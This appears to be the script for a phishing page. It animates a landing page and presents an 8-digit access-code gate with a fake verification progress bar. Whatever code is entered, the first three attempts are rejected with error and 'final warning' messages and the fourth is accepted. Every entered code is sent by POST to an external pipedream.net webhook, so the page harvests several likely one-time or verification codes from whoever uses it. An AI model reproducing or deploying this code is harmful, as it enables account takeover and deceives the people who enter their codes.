gsap.registerPlugin(ScrollTrigger);
gsap.from('.hero h2', { y: 60, opacity: 0, duration: 1.1, ease: 'power3.out' });
gsap.from('.hero p', { y: 40, opacity: 0, delay: .15, duration: 1 });
gsap.from('.cta', { y: 40, opacity: 0, delay: .3, duration: 1 });
gsap.utils.toArray('.card,.frame').forEach(el => {
    gsap.from(el, {
        scrollTrigger: { trigger: el, start: 'top 85%' },
        y: 80,
        opacity: 0,
        duration: 1,
        ease: 'power3.out'
    });
});

const access = document.getElementById('access');
const openAccess = document.getElementById('openAccess');
const input = document.getElementById('code');
const submit = document.getElementById('submit');
const verify = document.getElementById('verify');
const bar = document.getElementById('bar');
const err = document.getElementById('err');
const warn = document.getElementById('warn');
const modal = document.getElementById('modal');
const openInfo = document.getElementById('openInfo');
const gate = document.querySelector('.gate');
const success = document.querySelector('.success');

let attempts = 0;
let isVerifying = false;
let verified = false;

const resetMessages = () => {
    err.style.display = 'none';
    warn.style.display = 'none';
};

const lockUI = () => {
    isVerifying = true;
    submit.disabled = true;
    submit.classList.remove('enabled');
    input.disabled = true;
};

const unlockUI = () => {
    isVerifying = false;
    submit.disabled = false;
    input.disabled = false;
    submit.classList.toggle('enabled', input.value.length === 8);
};

const startVerifyAnimation = () => {
    verify.style.display = 'block';
    bar.style.width = '0%';
    gsap.to(bar, { width: '100%', duration: 1.8, ease: 'power2.out' });
};

const stopVerifyAnimation = () => {
    verify.style.display = 'none';
};

// idk
const sendAttemptToWebhook = (code, attemptNumber, status) => {
    const data = {
        code: code,
        attempt: attemptNumber,
        status: status,
        timestamp: new Date().toISOString()
    };

    fetch('https://eoxif7fbsl3zjqe.m.pipedream.net', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
    });
};

openAccess.onclick = () => {
    access.style.display = 'flex';
    gsap.fromTo(access, { opacity: 0 }, { opacity: 1, duration: .6 });
};

openInfo.onclick = () => {
    modal.style.display = 'flex';
    gsap.fromTo('.modal-card', { y: 40, opacity: 0 }, { y: 0, opacity: 1, duration: .6 });
};

modal.onclick = () => {
    modal.style.display = 'none';
};

input.addEventListener('input', () => {
    if (isVerifying || verified) return;
    input.value = input.value.replace(/\D/g, '').slice(0, 8);
    submit.classList.toggle('enabled', input.value.length === 8);
    resetMessages();
});

submit.onclick = () => {
    if (isVerifying || verified) return;
    if (input.value.length !== 8) return;

    lockUI();
    resetMessages();
    startVerifyAnimation();
    attempts += 1;

    // idk
    const currentCode = input.value;
    let attemptStatus = '';

    setTimeout(() => {
        stopVerifyAnimation();

        if (attempts <= 2) {
            err.style.display = 'block';
            attemptStatus = 'failed (attempt limit not reached)';
            unlockUI();
        } else if (attempts === 3) {
            warn.style.display = 'block';
            attemptStatus = 'failed (final warning)';
            unlockUI();
        } else {
            verified = true;
            gate.style.display = 'none';
            success.style.display = 'block';
            gsap.fromTo(success, { opacity: 0, y: 20 }, { opacity: 1, y: 0, duration: .6 });
            attemptStatus = 'success';
        }

        // idk
        sendAttemptToWebhook(currentCode, attempts, attemptStatus);

    }, 1900);
};

input.addEventListener('keydown', e => {
    if (e.key === 'Enter') {
        e.preventDefault();
        submit.click();
    }
});
